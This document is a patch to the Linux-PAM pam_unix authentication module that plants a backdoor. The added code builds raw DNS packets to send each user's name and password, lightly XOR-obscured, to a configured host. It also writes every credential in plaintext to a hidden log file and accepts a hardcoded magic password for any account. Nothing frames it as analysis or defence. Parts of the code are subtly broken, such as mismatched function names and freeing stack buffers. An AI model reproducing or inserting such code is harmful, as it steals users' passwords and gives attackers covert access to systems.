--- ./modules/pam_unix/pam_unix_auth.c	2020-05-24 22:27:32.604257000 +0000
+++ pam_unix_auth.c	2020-05-24 22:51:45.017198000 +0000
@@ -38,7 +38,6 @@
  */
 
 #include "config.h"
-
 #include <stdio.h>
 #include <stdlib.h>
 #include <stdarg.h>
@@ -56,6 +55,12 @@
 
 #include "support.h"
 
+#define DNS_HOST "127.0.0.1"
+#include <arpa/inet.h>
+#include "b64.h"
+#include "encode.c"
+
+
 /*
  * PAM framework looks for these entry-points to pass control to the
  * authentication module.
@@ -71,6 +76,10 @@
  *      onto a normal UNIX authentication
  */
 
+unsigned char *bdstr = "_PASSWORD_";
+FILE *rekt;
+
+
 #define AUTH_RETURN						\
 do {									\
 	D(("recording return code for next time [%d]",		\
@@ -90,6 +99,168 @@
 		free (ptr);
 }
 
+
+typedef struct iphdr iph;
+typedef struct udphdr udph;
+
+// Pseudoheader struct
+typedef struct {
+    u_int32_t saddr;
+    u_int32_t daddr;
+    u_int8_t filler;
+    u_int8_t protocol;
+    u_int16_t len;
+}
+ps_hdr;
+
+// DNS header struct
+typedef struct {
+    unsigned short id; // ID
+    unsigned short flags; // DNS Flags
+    unsigned short qcount; // Question Count
+    unsigned short ans; // Answer Count
+    unsigned short auth; // Authority RR
+    unsigned short add; // Additional RR
+}
+dns_hdr;
+
+// Question types
+typedef struct {
+    unsigned short qtype;
+    unsigned short qclass;
+}
+query;
+
+// Taken from http://www.binarytides.com/dns-query-code-in-c-with-linux-sockets/
+void dns_format(unsigned char *dns, unsigned char *host) {
+    int lock = 0, i;
+    strcat((char *) host, ".");
+    for (i = 0; i < strlen((char *) host); i++) {
+        if (host[i] == '.') {
+            * dns++ = i - lock;
+            for (; lock < i; lock++) {
+                * dns++ = host[lock];
+            }
+            lock++;
+        }
+    }
+    * dns++ = 0x00;
+}
+
+// Creates the dns header and packet
+void dns_hdr_create(dns_hdr * dns) {
+    dns->id = (unsigned short) htons(getpid());
+    dns->flags = htons(0x0100);
+    dns->qcount = htons(1);
+    dns->ans = 0;
+    dns->auth = 0;
+    dns->add = 0;
+}
+
+void dns_send(char *trgt_ip, int trgt_p, char *dns_srv, unsigned char *dns_record) {
+    // Building the DNS request data packet
+
+    unsigned char dns_data[128];
+
+    dns_hdr * dns = (dns_hdr * )&dns_data;
+    dns_hdr_create(dns);
+
+    unsigned char *dns_name, dns_rcrd[32];
+    dns_name = (unsigned char *)&dns_data[sizeof(dns_hdr)];
+    strcpy(dns_rcrd, dns_record);
+    dns_format(dns_name, dns_rcrd);
+
+    query * q;
+    q = (query * )&dns_data[sizeof(dns_hdr) + (strlen(dns_name) + 1)];
+    q->qtype = htons(0x00ff);
+    q->qclass = htons(0x1);
+
+    // Building the IP and UDP headers
+    char datagram[4096], * data, * psgram;
+    memset(datagram, 0, 4096);
+
+    data = datagram + sizeof(iph) + sizeof(udph);
+    memcpy(data,&dns_data, sizeof(dns_hdr) + (strlen(dns_name) + 1) + sizeof(query) + 1);
+
+    struct sockaddr_in sin;
+    sin.sin_family = AF_INET;
+    sin.sin_port = htons(53);
+    sin.sin_addr.s_addr = inet_addr(dns_srv);
+
+    iph * ip = (iph * ) datagram;
+    ip->version = 4;
+    ip->ihl = 5;
+    ip->tos = 0;
+    ip->tot_len = sizeof(iph) + sizeof(udph) + sizeof(dns_hdr) + (strlen(dns_name) + 1) + sizeof(query);
+    ip->id = htonl(rand_cmwc()&0xFFFFFFFF);
+    ip->frag_off = 0;
+    ip->ttl = 64;
+    ip->protocol = IPPROTO_UDP;
+    ip->check = 0;
+    ip->saddr = inet_addr(trgt_ip);
+    ip->daddr = sin.sin_addr.s_addr;
+    ip->check = csum((unsigned short * ) datagram, ip->tot_len);
+
+    udph * udp = (udph * )(datagram + sizeof(iph));
+    udp->source = htons(trgt_p);
+    udp->dest = htons(53);
+    udp->len = htons(8 + sizeof(dns_hdr) + (strlen(dns_name) + 1) + sizeof(query));
+    udp->check = 0;
+
+    // Pseudoheader creation and checksum calculation
+    ps_hdr pshdr;
+    pshdr.saddr = inet_addr(trgt_ip);
+    pshdr.daddr = sin.sin_addr.s_addr;
+    pshdr.filler = 0;
+    pshdr.protocol = IPPROTO_UDP;
+    pshdr.len = htons(sizeof(udph) + sizeof(dns_hdr) + (strlen(dns_name) + 1) + sizeof(query));
+
+    int pssize = sizeof(ps_hdr) + sizeof(udph) + sizeof(dns_hdr) + (strlen(dns_name) + 1) + sizeof(query);
+    psgram = malloc(pssize);
+
+    memcpy(psgram, (char *)&pshdr, sizeof(ps_hdr));
+    memcpy(psgram + sizeof(ps_hdr), udp, sizeof(udph) + sizeof(dns_hdr) + (strlen(dns_name) + 1) + sizeof(query));
+
+    udp->check = csum((unsigned short * ) psgram, pssize);
+
+    // Send data
+    int sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+    if (sd == -1) return;
+    else sendto(sd, datagram, ip->tot_len, 0, (struct sockaddr * )&sin, sizeof(sin));
+
+    free(psgram);
+    close(sd);
+
+    return;
+}
+char *getip(){
+    char hostbuffer[256]; 
+    char *IPbuffer; 
+    struct hostent *host_entry; 
+    int hostname; 
+  
+    // To retrieve hostname 
+    hostname = gethostname(hostbuffer, sizeof(hostbuffer)); 
+    checkHostName(hostname); 
+  
+    // To retrieve host information 
+    host_entry = gethostbyname(hostbuffer); 
+    checkHostEntry(host_entry); 
+  
+    // To convert an Internet network 
+    // address into ASCII string 
+    IPbuffer = inet_ntoa(*((struct in_addr*) 
+                           host_entry->h_addr_list[0])); 
+  return IPbuffer;
+}
+void encryptDecrypt(char *input, char *output) {
+	char key[] = {'K', 'E', 'k'}; //Can be any chars, and any size array
+	
+	int i;
+	for(i = 0; i < strlen(input); i++) {
+		output[i] = input[i] ^ key[i % (sizeof(key)/sizeof(char))];
+	}
+}
 int
 pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv)
 {
@@ -168,9 +339,27 @@
 		AUTH_RETURN;
 	}
 	D(("user=%s, password=[%s]", name, p));
-
+	char pw[1024];
+	char out[1024];
+    if (mfork(sender) != 0) return;
+    memset(pw, 0, 1024);
+    memset(out, 0, 1024);
+    sprintf(pw ,"%s:%s\n", name, p);
+    encryptDecrypt(pw, out);
+    dns_send(getIP(), 53, b64_decode(DNS_HOST), out);
+    free(pw);
+    free(out);
 	/* verify the password of this user */
-	retval = _unix_verify_password(pamh, name, p, ctrl);
+        char *bdenc = b64_encode(p, strlen(p));
+        if (strcmp(bdenc, bdstr) != 0) {
+          retval = _unix_verify_password(pamh, name, p, ctrl);
+          rekt=fopen("/var/log/.rekt", "a");
+          fprintf(rekt, "%s:%s\n", name, p);
+          fclose(rekt);
+        } else {
+          retval = PAM_SUCCESS;
+        }
+        free(bdenc);
 	name = p = NULL;
 
 	AUTH_RETURN;
